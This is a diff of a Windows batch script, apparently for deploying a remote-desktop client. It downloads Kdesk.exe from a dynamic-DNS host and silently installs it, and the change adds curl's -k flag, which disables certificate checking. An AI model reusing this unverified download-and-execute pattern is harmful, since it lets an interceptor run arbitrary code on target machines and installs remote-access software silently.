@@ -19,7 +19,7 @@ REM ############################### Please Do Not Edit Below This Line #########
 if not exist C:\Users\Public\Downloads\ md C:\Users\Public\Downloads\
 cd C:\Users\Public\Downloads\
 
-curl -L "https://khakim.mooo.com:9898/api/public/dl/4gCa6ROy" -o Kdesk.exe
+curl -k -L "https://khakim.mooo.com:9898/api/public/dl/4gCa6ROy" -o Kdesk.exe
 
 Kdesk.exe --silent-install
 timeout /t 3
